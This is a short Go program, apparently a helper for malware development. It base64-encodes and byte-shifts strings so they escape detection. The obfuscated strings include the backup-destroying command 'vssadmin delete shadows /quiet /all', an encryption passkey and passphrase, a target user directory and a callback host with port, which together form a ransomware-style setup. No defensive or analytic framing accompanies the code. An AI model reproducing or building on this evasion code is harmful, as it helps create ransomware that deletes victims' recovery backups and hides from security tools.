package main

import (
	"fmt"
	"encoding/base64"
)

func ofuscarTexto(texto string) string {
	pay := base64.StdEncoding.EncodeToString([]byte(texto))

	out := make([]byte, len(pay))
	for i := 0; i < len(pay); i++ {
		out[i] = pay[i] + 1
	}
	return string(out)

}

func main() {

	dir := "C:/Users/vboxuser"
	dir = ofuscarTexto(dir)
	fmt.Printf("ofuscado dir: %s\n", dir)
	passkey := "comoMolo"
	passkey = ofuscarTexto(passkey)
	fmt.Printf("ofuscado passkey: %s\n", passkey)
	vssadmin := "vssadmin"
	vssadmin = ofuscarTexto(vssadmin)
	fmt.Printf("ofuscado vssadmin: %s\n", vssadmin)
	list := "list"
	list = ofuscarTexto(list)
	fmt.Printf("ofuscado list: %s\n", list)
	shadows := "shadows"
	shadows = ofuscarTexto(shadows)
	fmt.Printf("ofuscado shadows: %s\n", shadows)

	delete := "delete"
	delete = ofuscarTexto(delete)
	fmt.Printf("ofuscado delete: %s\n", delete)
	quiet := "/quiet"
	quiet = ofuscarTexto(quiet)
	fmt.Printf("ofuscado quiet: %s\n", quiet)
	all := "/all"
	all = ofuscarTexto(all)
	fmt.Printf("ofuscado all: %s\n", all)
	passphrase := "comoMolo"
	passphrase = ofuscarTexto(passphrase)
	fmt.Printf("ofuscado passphrase: %s\n", passphrase)
	host := "192.168.1.154:8989"
	host = ofuscarTexto(host)
	fmt.Printf("ofuscado host: %s\n", host)

}
